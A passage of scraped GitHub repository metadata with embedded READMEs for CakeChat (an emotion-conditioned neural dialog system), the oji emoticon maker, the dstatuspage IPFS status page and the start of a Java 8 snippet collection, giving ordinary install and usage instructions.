express emotions in a text conversation. [Try it online!](https://cakechat.replika.ai/)\n\n![Demo](https://user-images.githubusercontent.com/764902/34832660-92570bfe-f6fe-11e7-9802-db2f8730a997.png)\n\nIt is written in [Theano](http://deeplearning.net/software/theano/) and [Lasagne](https://github.com/Lasagne/Lasagne). It uses end-to-end trained embeddings of 5 different emotions to generate responses conditioned by a given emotion.\n\nThe code is flexible and allows to condition a response by an arbitrary categorical variable defined for some samples in the training data. With CakeChat you can, for example, train your own persona-based neural conversational model[<sup>\\[5\\]</sup>](#f5) or create an emotional chatting machine without external memory[<sup>\\[4\\]</sup>](#f4).\n\n\n## Table of contents\n\n  * [Network architecture and features](#network-architecture-and-features)\n  * [Quick start](#quick-start)\n  * [Setup](#setup)\n    * [Docker](#docker)\n      * [CPU-only setup](#cpu-only-setup)\n      * [GPU-enabled setup](#gpu-enabled-setup)\n    * [Manual setup](#manual-setup)\n  * [Getting the model](#getting-the-model)\n    * [Using a pre-trained model](#using-a-pre-trained-model)\n    * [Training your own model](#training-your-own-model)\n    * [Existing training datasets](#existing-training-datasets)\n  * [Running the system](#running-the-system)\n    * [Local HTTP\\-server](#local-http-server)\n      * [HTTP\\-server API description](#http-server-api-description)\n    * [Gunicorn HTTP\\-server](#gunicorn-http-server)\n    * [Telegram bot](#telegram-bot)\n  * [Repository overview](#repository-overview)\n    * [Important tools](#important-tools)\n    * [Important configuration settings](#important-configuration-settings)\n  * [Example use cases](#example-use-cases)\n  * [References](#references)\n  * [Credits & Support](#credits--support)\n  * [License](#license)\n\n\n## Network architecture and features\n\n![Network architecture](https://user-images.githubusercontent.com/4047271/34774960-71c7bfa0-f622-11e7-812b-cdb84472577a.png)\n\n\n* Model:\n    * Hierarchical Recurrent Encoder-Decoder (HRED) architecture for handling deep dialog context[<sup>\\[7\\]</sup>](#f7)\n    * Multilayer RNN with GRU cells. First layer of the utterance-level encoder is always bidirectional.\n    * Thought vector is fed into decoder on each decoding step.\n    * Decoder can be conditioned on any string label. For example: emotion label or id of a person talking.\n* Word embedding layer:\n    * May be initialized using w2v model trained on your own corpus.\n    * Embedding layer may either stay fixed of be fine-tuned along with all other weights of the network.\n* Decoding\n    * 4 different response generation algorithms: \"sampling\", \"beamsearch\", \"sampling-reranking\" and \"beamsearch-reranking\".\n    Reranking of the generated candidates is performed according to the log-likelihood or MMI-criteria[<sup>\\[3\\]</sup>](#f3).\n    See [configuration settings description](#important-configuration-settings) for details.\n* Metrics:\n    * Perplexity\n    * n-gram distinct metrics adjusted to the samples size[<sup>\\[3\\]</sup>](#f3).\n    * Lexical similarity between samples of the model and some fixed dataset.\n    Lexical similarity is a cosine distance between TF-IDF vector of responses generated by the model and tokens\n    in the dataset.\n    * Ranking metrics: mean average precision and mean recall@k.[<sup>\\[8\\]</sup>](#f8)\n\n\n## Quick start\n\nRun the CPU-only pre-built docker image & start the CakeChat serving the model on 8080 port:\n\n```(bash)\ndocker run --name cakechat-dev -p 127.0.0.1:8080:8080 -it lukalabs/cakechat:latest \\\n    bash -c \"python bin/cakechat_server.py\"\n```\n\n(Or) using the GPU-enabled image:\n\n```(bash)\nnvidia-docker run --name cakechat-gpu-dev -p 127.0.0.1:8080:8080 -it lukalabs/cakechat-gpu:latest \\\n    bash -c \"USE_GPU=0 python bin/cakechat_server.py\"\n```\n\nThat's it! Now you can try it by running `python tools/test_api.py -f localhost -p 8080 -c \"Hi! How are you?\"` from the host command line.\n\n## Setup\n\n### Docker\n\nThis is the easiest way to set up the environment and install all the dependencies.\n\n#### CPU-only setup\n\n1. Install [Docker](https://docs.docker.com/engine/installation/)\n\n2. Build a docker image\n\nBuild a CPU-only image:\n\n```(bash)\ndocker build -t cakechat:latest -f dockerfiles/Dockerfile.cpu dockerfiles/\n```\n\n3. Start the container\n\nRun a docker container in the CPU-only environment\n```(bash)\ndocker run --name <CONTAINER_NAME> -it cakechat:latest\n```\n\n#### GPU-enabled setup\n\n1. Install [nvidia-docker](https://github.com/NVIDIA/nvidia-docker) for the GPU support.\n\n2. Build a GPU-enabled docker image:\n\n```(bash)\nnvidia-docker build -t cakechat-gpu:latest -f dockerfiles/Dockerfile.gpu dockerfiles/\n```\n\n3. Start the container\n\nRun a docker container in the GPU-enabled environment:\n\n```(bash)\nnvidia-docker run --name <CONTAINER_NAME> -it cakechat-gpu:latest\n```\n\nThat's it! Now you can train your model and chat with it.\n\n\n### Manual setup\n\nIf you don't want to deal with docker images and containers, you can always simply run (with `sudo`, `--user` or inside your **[virtualenv](https://virtualenv.pypa.io/en/stable/)**):\n\n```(bash)\npip install -r requirements.txt\n```\n\nMost likely this will do the job.\n**NB:** This method only provides a CPU-only environment. To get a GPU support, you'll need to build and install **[libgpuarray](http://deeplearning.net/software/libgpuarray/installation.html)** by yourself (see [Dockerfile.gpu](dockerfiles/Dockerfile.gpu) for example).\n\n\n## Getting the model\n\n### Using a pre-trained model\n\nRun `python tools/download_model.py` to download our pre-trained model.\n\nThe model is trained with **context size 3** where\nthe encoded sequence contains **30 tokens or less** and\nthe decoded sequence contains **32 tokens or less**.\nBoth encoder and decoder contain **2 GRU layers** with **512 hidden units** each.\n\nThe model was trained on a Twitter preprocessed conversational data.\nTo clean up the data, we removed URLs, retweets and citations.\nAlso we removed mentions and hashtags that are not preceded by normal words or punctuation marks\nand filtered out all messages that contains more than 30 tokens.  \nThen we marked out each utterance with our emotions classifier that predicts one of the\n5 emotions: \"neutral\", \"joy\", \"anger\", \"sadness\" and \"fear\".\nTo mark-up your own corpus with emotions you can use, for example, [DeepMoji tool](https://github.com/bfelbo/DeepMoji)\nor any other emotions classifier that you have.\n\n### Training your own model\n\n1. Put your training text corpus to [`data/corpora_processed/`](data/corpora_processed/).\nEach line of the corpus file should be a JSON object containing a list of dialog messages sorted in chronological order.\nCode is fully language-agnostic — you can use any unicode texts in datasets.\nRefer to our dummy corpus to see the input format [`data/corpora_processed/train_processed_dialogs.txt`](data/corpora_processed/train_processed_dialogs.txt).\n\n2. The following datasets are used for validation and early stopping:\n\n* [`data/corpora_processed/val_processed_dialogs.txt`](data/corpora_processed/val_processed_dialogs.txt)(dummy example) - for the context sensitive dataset\n* [`data/quality/context_free_validation_set.txt`](data/quality/context_free_validation_set.txt) - for the context-free validation dataset\n* [`data/quality/context_free_questions.txt`](data/quality/context_free_questions.txt) - is used for generating responses for logging and computing distinct-metrics\n* [`data/quality/context_free_test_set.txt`](data/quality/context_free_test_set.txt) - is used for computing metrics of the trained model, e.g. ranking metrics\n\n3. Set up training parameters in [`cakechat/config.py`](cakechat/config.py).\nSee [configuration settings description](#important-configuration-settings) for more details.\n4. Run `python tools/prepare_index_files.py` to build the index files with tokens and conditions from the training corpus.\n5. Run `python tools/train.py`. Don't forget to set `USE_GPU=<GPU_ID>` environment variable (with GPU_ID as from **nvidia-smi**) if you want to use GPU.\nUse `SLICE_TRAINSET=N` to train the model on a subset of the first N samples of your training data to speed up preprocessing for debugging.\n6. You can also set `IS_DEV=1` to enable the \"development mode\". It uses a reduced number of model parameters (decreased hidden layer dimensions, input and output sizes of token sequences, etc.), performs verbose logging and disables Theano graph optimizations. Use this mode for debugging.\n7. Weights of your model will be saved in `data/nn_models/`.\n\n### Existing training datasets\nYou can train a dialog model on any text conversational dataset available to you. A great overview of existing conversational datasets can be found here: https://breakend.github.io/DialogDatasets/\n\n\n## Running the system\n\n### Local HTTP-server\n\nRun a server that processes HTTP-requests with given input messages (contexts) and returns response messages of the model:\n\n```(bash)\npython bin/cakechat_server.py\n```\n\nSpecify `USE_GPU=<GPU_ID>` environment variable if you want to use a certain GPU.\n\nWait until the model is compiled.\n**Don't forget to run [`tools/download_model.py`](tools/download_model.py) prior to running [`bin/cakechat_server.py`](bin/cakechat_server.py) if you want to start an API with our pre-trained model.**\n\nTo make sure everything works fine, test the model on the following conversation:\n\n> – Hi, Eddie, what's up?  \n> – Not much, what about you?  \n> – Fine, thanks. Are you going to the movies tomorrow?\n\n\n```(bash)\npython tools/test_api.py -f 127.0.0.1 -p 8080 \\\n    -c \"Hi, Eddie, what's up?\" \\\n    -c \"Not much, what about you?\" \\\n    -c \"Fine, thanks. Are you going to the movies tomorrow?\"\n```\n\n#### HTTP-server API description\n\n##### /cakechat_api/v1/actions/get_response\nJSON parameters are:\n\n|Parameter|Type|Description|\n|---|---|---|\n|context|list of strings|List of previous messages from the dialogue history (max. 3 is used)|\n|emotion|string, one of enum|One of {'neutral', 'anger', 'joy', 'fear', 'sadness'}. An emotion to condition the response on. Optional param, if not specified, 'neutral' is used|\n\n##### Request\n```\nPOST /cakechat_api/v1/actions/get_response\ndata: {\n 'context': ['Hello', 'Hi!', 'How are you?'],\n 'emotion': 'joy'\n}\n```\n\n##### Response OK\n```\n200 OK\n{\n 'response': 'I\\'m fine!'\n}\n```\n\n### Gunicorn HTTP-server\n\nWe recommend to use [Gunicorn](http://gunicorn.org/) for serving the API of your model at a production scale.\n\nRun a server that processes HTTP-queries with input messages and returns response messages of the model:\n\n```(bash)\ncd bin && gunicorn cakechat_server:app -w 1 -b 127.0.0.1:8080 --timeout 2000\n```\n\nYou may need to install gunicorn from pip: `pip install gunicorn`.\n\n\n### Telegram bot\n\nYou can also test your model in a Telegram bot:\n[create a telegram bot](https://core.telegram.org/bots#3-how-do-i-create-a-bot) and run\n\n`python tools/telegram_bot.py --token <YOUR_BOT_TOKEN>`\n\n\n## Repository overview\n\n* `cakechat/dialog_model/` - contains computational graph, training procedure and other model utilities\n* `cakechat/dialog_model/inference/` - algorithms for response generation\n* `cakechat/dialog_model/quality/` - code for metrics calculation and logging\n* `cakechat/utils/` - utilities for text processing, w2v training, etc.\n* `cakechat/api/` - functions to run http server: API configuration, error handling\n* `tools/` - scripts for training, testing and evaluating your model\n\n\n### Important tools\n\n* [`bin/cakechat_server.py`](bin/cakechat_server.py) - \nRuns an HTTP-server that returns response messages of the model given dialog contexts and an emotion. See [run section](#gunicorn-http-server) for details.\n* [`tools/train.py`](tools/train.py) - \nTrains the model on your data. You can use the `--reverse` option to train the model used in \"\\*-reranking\" response generation algorithms for more accurate predictions.\n* [`tools/prepare_index_files.py`](tools/prepare_index_files.py) - \nPrepares index for the most commonly used tokens and conditions. Use this script before training the model.\n* [`tools/quality/ranking_quality.py`](tools/quality/ranking_quality.py) - \nComputes ranking metrics of a dialog model.\n* [`tools/quality/prediction_distinctness.py`](tools/quality/prediction_distinctness.py) - \nComputes distinct-metrics of a dialog model.\nSee the [features section](#network=architecture=and-features) for details about the metrics.\n* [`tools/quality/condition_quality.py`](tools/quality/condition_quality.py) - \nComputes metrics on different subsets of a data according to the condition value.\n* [`tools/generate_predictions.py`](tools/generate_predictions.py) - \nEvaluates the model. Generates predictions of a dialog model on the set of given dialog contexts and then computes metrics.\nNote that you should have a reverse-model in the `data/nn_models` directory, if you want to use \"\\*-reranking\" prediction modes.\n* [`tools/generate_predictions_for_condition.py`](tools/generate_predictions_for_condition.py) - \nGenerates predictions for a given condition value.\n* [`tools/test_api.py`](tools/test_api.py) - \nExample code to send requests to a running HTTP-server.\n* [`tools/download_model.py`](tools/download_model.py) - \nDownloads the pre-trained model and index files associated with it. Also compiles the whole model once to create Theano cache.\n* [`tools/telegram_bot.py`](tools/telegram_bot.py) - \nRuns a Telegram bot that uses a trained model.\n\n\n### Important configuration settings\n\nAll the configuration parameters for the network architecture, training, predicting and logging steps are defined in [`cakechat/config.py`](cakechat/config.py).\nSome inference parameters used in an HTTP-server are defined in [`cakechat/api/config.py`](cakechat/api/config.py).\n\n* Network architecture and size\n    * `HIDDEN_LAYER_DIMENSION` is the main parameter that defines the number of hidden units in recurrent layers.\n    * `WORD_EMBEDDING_DIMENSION` and `CONDITION_EMBEDDING_DIMENSION` define the number of hidden units that each\n    token/condition are mapped into.\n    Together they sum up to the dimension of input vector passed to the encoder RNN.\n    * Number of units of the output layer of the decoder is defined by the number of tokens in the dictionary in the\n    tokens_index directory.\n* Decoding algorithm:\n    * `PREDICTION_MODE_FOR_TESTS` defines how the responses of the model are generated. The options are the following:\n        -  **sampling** – response is sampled from output distribution token-by-token. \n        For every token the temperature transform is performed prior to sampling. \n        You can control the temperature value by tuning `DEFAULT_TEMPERATURE` parameter.\n        - **sampling-reranking** – multiple candidate-responses are generated using sampling procedure described above.\n        After that the candidates are ranked according to their MMI-score[<sup>\\[3\\]</sup>](#f3)\n        You can tune this mode by picking `SAMPLES_NUM_FOR_RERANKING` and `MMI_REVERSE_MODEL_SCORE_WEIGHT` parameters.\n        - **beamsearch** – candidates are sampled using [beam search algorithm](https://en.wikipedia.org/wiki/Beam_search).\n        The candidates are ordered according to their log-likelihood score computed by the beam search procedure.\n        - **beamsearch-reranking** – same as above, but the candidates are re-ordered after the generation in the same way as\n        in sampling-reranking mode.\n        \n    Note that there are other parameters that affect the response generation process.\n    See `REPETITION_PENALIZE_COEFFICIENT`, `NON_PENALIZABLE_TOKENS`, `MAX_PREDICTIONS_LENGTH`.\n\n## Example use cases\n\nBy providing additional condition labels within a dataset entries, you can build the following models:\n* [A Persona-Based Neural Conversation Model][5] — a model that allows to condition responses on a persona ID to make them lexically similar to the given persona's linguistic style.\n* [Emotional Chatting Machine][4]-like model — a model that allows to condition responses on an emotion to provide emotional styles (anger, sadness, joy, etc).\n* [Topic Aware Neural Response Generation][6]-like model — a model that allows to condition responses on a certain topic to keep the topic-aware conversation.\n\nTo make use of these extra conditions, please refer to the section [Training your own model](#training-your-own-model). Just set the \"condition\" field in the [training set](data/corpora_processed/train_processed_dialogs.txt) to one of the following: **persona ID**, **emotion** or **topic** label, update the index files and start the training.\n\n## References\n\n* <a name=\"f1\"/><sup>\\[1\\]</sup> [A Neural Conversational Model][1]\n* <a name=\"f2\"/><sup>\\[2\\]</sup> [How NOT To Evaluate Your Dialogue System][2]\n* <a name=\"f3\"/><sup>\\[3\\]</sup> [A Diversity-Promoting Objective Function for Neural Conversation Models][3]\n* <a name=\"f4\"/><sup>\\[4\\]</sup> [Emotional Chatting Machine: Emotional Conversation Generation with Internal and External Memory][4]\n* <a name=\"f5\"/><sup>\\[5\\]</sup> [A Persona-Based Neural Conversation Model][5]\n* <a name=\"f6\"/><sup>\\[6\\]</sup> [Topic Aware Neural Response Generation][6]\n* <a name=\"f7\"/><sup>\\[7\\]</sup> [A Hierarchical Recurrent Encoder-Decoder For Generative Context-Aware Query Suggestion][7]\n* <a name=\"f8\"/><sup>\\[8\\]</sup> [Quantitative Evaluation of User Simulation Techniques for Spoken Dialogue Systems][8]\n\n[1]: https://arxiv.org/pdf/1506.05869.pdf\n[2]: https://arxiv.org/pdf/1603.08023.pdf\n[3]: https://arxiv.org/pdf/1510.03055.pdf\n[4]: https://arxiv.org/pdf/1704.01074.pdf\n[5]: https://arxiv.org/pdf/1603.06155.pdf\n[6]: https://arxiv.org/pdf/1606.08340v2.pdf\n[7]: https://arxiv.org/pdf/1507.02221.pdf\n[8]: http://mi.eng.cam.ac.uk/~sjy/papers/scgy05.pdf\n\n## Credits & Support\n**CakeChat** is developed and maintained by the [Replika team](https://replika.ai): [Michael Khalman](https://github.com/mihaha), [Nikita Smetanin](https://github.com/nsmetanin), [Artem Sobolev](https://github.com/artsobolev), [Nicolas Ivanov](https://github.com/nicolas-ivanov), [Artem Rodichev](https://github.com/rodart) and [Denis Fedorenko](https://github.com/sadreamer). Demo by [Oleg Akbarov](https://github.com/olegakbarov), [Alexander Kuznetsov](https://github.com/alexkuz) and [Vladimir Chernosvitov](http://chernosvitov.com/).\n\nAll issues and feature requests can be tracked here - [GitHub Issues](https://github.com/lukalabs/cakechat/issues).\n\n## License\n© 2018 Luka, Inc. Licensed under the Apache License, Version 2.0. See LICENSE file for more details.\n","byteSize":18708},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":440},"createdAt":"2018-01-30T18:02:58Z","updatedAt":"2018-02-17T06:04:47Z","pushedAt":"2018-02-16T06:21:50Z","description":"CakeChat: Emotional Generative Dialog System","subscribersCount":{"totalCount":36},"diskUsage":113,"pullRequestsOpen":{"totalCount":3},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":4},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":4},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":5}}},"tags":{"totalCount":2},"releases":{"totalCount":2},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"xxczaki","followers":{"totalCount":49},"repositories":{"totalCount":81},"following":{"totalCount":13},"location":"★*★*★*★*★","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"akepinski.me"},"repository":{"name":"oji","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":false,"forkCount":11,"readme_md":{"text":"<p align=\"center\">\n  <img src=\"https://i.imgur.com/2fhhLzH.gif\" href=\"\" height=\"256\">\n  <h2 align=\"center\">OJI</h2>\n  <p align=\"center\">(◕‿◕) Text Emoticons Maker<p>\n  \n<p align=\"center\">\n<a href=\"https://travis-ci.org/xxczaki/oji\"><img src=\"https://travis-ci.org/xxczaki/oji.svg?branch=master\" alt=\"Build Status\"></a> \n<a href=\"https://ci.appveyor.com/project/xxczaki/oji\"><img src=\"https://ci.appveyor.com/api/projects/status/sbxv43mauvm359av?svg=true\" alt=\"AppVeyor Build Status\"></a>\n<a href=\"https://github.com/sindresorhus/xo\"><img src=\"https://img.shields.io/badge/code_style-XO-5ed9c7.svg\" alt=\"XO Code Style\"></a>\n<a href=\"https://www.youtube.com/watch?v=9auOCbH5Ns4\"><img src=\"https://img.shields.io/badge/unicorn-approved-ff69b4.svg\" alt=\"Unicorn Approved\"></a>\n  </p>\n  \n<p align=\"center\"><img src=\"https://i.imgur.com/Ilh90oI.gif\" alt=\"GIF\"></p>\n<h5 align=\"center\"><a href=\"https://www.producthunt.com/posts/oji\">Discuss it on Product Hunt! :rocket:</a></h5>\n\n## :floppy_disk: Installation\n\n``` bash\nnpm i -g oji\n```\n<a href=\"https://www.patreon.com/akepinski\">\n\t<img src=\"https://c5.patreon.com/external/logo/become_a_patron_button@2x.png\" width=\"160\">\n</a>\n\n## :feet: Usage\n\nJust type `oji` to start interactive emoticon creator! Works on every platform :unicorn:\n\n## :package: npm Dependencies [![Known Vulnerabilities](https://snyk.io/test/github/xxczaki/oji/badge.svg)](https://snyk.io/test/github/xxczaki/oji)\n\n- [inquirer](https://www.npmjs.com/package/inquirer)\n- [clipboardy](https://www.npmjs.com/package/clipboardy)\n- [opn](https://www.npmjs.com/package/opn)\n- [log-symbols](https://www.npmjs.com/package/log-symbols)\n- [chalk](https://www.npmjs.com/package/chalk)\n- [xo](https://www.npmjs.com/package/xo)\n\n## :warning: Note\n\nNode.js >= 6 is required!\n\n## :nerd_face: Author\n\n[![Antoni Kepinski](https://github.com/xxczaki.png?size=100)](https://akepinski.me)\n---|\n[Antoni Kepinski :rocket:](https://akepinski.me)\n\n## :clipboard: License\n\nMIT © [Antoni Kepinski](https://akepinski.me)\n\n[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2Fxxczaki%2Foji.svg?type=large)](https://app.fossa.io/projects/git%2Bgithub.com%2Fxxczaki%2Foji?ref=badge_large)\n","byteSize":2198},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":470},"createdAt":"2018-01-30T15:03:49Z","updatedAt":"2018-02-17T05:39:13Z","pushedAt":"2018-02-14T21:12:52Z","description":"(◕‿◕) Text Emoticons Maker","subscribersCount":{"totalCount":5},"diskUsage":67,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":65}}},"tags":{"totalCount":5},"releases":{"totalCount":5},"type":"user"},"siteAdmin":"false"},{"user":{"login":"paulogr","followers":{"totalCount":27},"repositories":{"totalCount":56},"following":{"totalCount":30},"location":"São Paulo, Brazil","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":10},"websiteUrl":""},"repository":{"name":"dstatuspage","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":21,"readme_md":{"text":"# D StatusPage\n\nA Decentralized StatusPage with no single point of failure published to [IPFS](https://ipfs.io).\n\n[Follow the HN thread about it.](https://news.ycombinator.com/item?id=16273609)\n\n## Give it a try\n\n```bash\n> npx dstatuspage --daemon\n```\n\n## Install\n\n```bash\n> npm install -g dstatuspage\n```\n\n## How to use\n\n```bash\n> dstatuspage --daemon\n```\n\nor connect to your already running IPFS daemon\n\n```bash\n> dstatuspage --no-ipfs [api_multiaddr]\n```\n\nAnd then access [http://localhost:7200](http://localhost:7200)\n\n## Developed with\n\n- [NodeJs](https://ipfs.io)\n- [Choo](https://choo.io)\n- [IPFS](https://ipfs.io)\n\n## Roadmap\n\n- Markdown support\n- Company logo upload\n- RSS Feed\n- i18n support\n- Import data from statuspage.io\n\n## License \n\nMIT\n\n## Say `Hi!` on Twitter\n\n[@paulo_gr](https://www.twitter.com/paulo_gr)\n","byteSize":825},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":512},"createdAt":"2018-01-30T01:06:43Z","updatedAt":"2018-02-16T19:18:07Z","pushedAt":"2018-02-13T17:19:34Z","description":"Decentralized Status Page","subscribersCount":{"totalCount":12},"diskUsage":268,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":13}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"biezhi","followers":{"totalCount":2005},"repositories":{"totalCount":66},"following":{"totalCount":61},"location":"Shanghai, China","organizations":{"totalCount":12},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}}],"totalCount":45},"websiteUrl":"https://biezhi.me"},"repository":{"name":"30-seconds-of-java8","primaryLanguage":{"name":"Java"},"license":"Creative Commons Zero v1.0 Universal","isArchived":false,"hasWikiEnabled":true,"forkCount":147,"readme_md":{"text":"# 30 seconds of java8\n\n[![License](https://img.shields.io/badge/license-CC0--1.0-blue.svg)](https://github.com/biezhi/30-seconds-of-java8/blob/master/LICENSE) \n[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com) \n[![Travis Build](https://travis-ci.org/biezhi/30-seconds-of-java8.svg?branch=master)](https://travis-ci.org/biezhi/30-seconds-of-java8)\n[![@biezhi on zhihu](https://img.shields.io/badge/zhihu-%40biezhi-red.svg)](https://www.zhihu.com/people/biezhi)\n[![](https://img.shields.io/github/followers/biezhi.svg?style=social&label=Follow%20Me)](https://github.com/biezhi)\n\n> 你可以在30秒或更短时间内收集有用的Java8代码片段。\n\n- 使用 <kbd>Ctrl</kbd> + <kbd>F</kbd> 或者 <kbd>command</kbd> + <kbd>F</kbd> 来查找代码片段。\n- 代码片段基于 Java8，如果你还不熟悉可以在[这里](https://zhuanlan.zhihu.com/java8)学习。\n- 代码片段翻译自 [little-java-functions](https://github.com/shekhargulati/little-java-functions)\n\n## 目录\n\n### 📚 Array (数组相关)\n\n<details>\n<summary>详细信息</summary>\n\n* [`chunk`](#chunk)\n* [`countOccurrences`](#countoccurrences)\n* [`deepFlatten`](#deepflatten)\n* [`difference`](#difference)\n* [`differenceWith`](#differencewith)\n* [`distinctValuesOfArray`](#distinctvaluesofarray)\n* [`dropElements`](#dropelements)\n* [`dropRight`](#dropright)\n* [`everyNth`](#everynth)\n* [`filterNonUnique`](#filternonunique)\n* [`flatten`](#flatten)\n* [`flattenDepth`](#flattendepth)\n* [`groupBy`](#groupby)\n* [`head`](#head)\n* [`initial`](#initial)\n* [`initializeArrayWithRange`](#initializearraywithrange)\n* 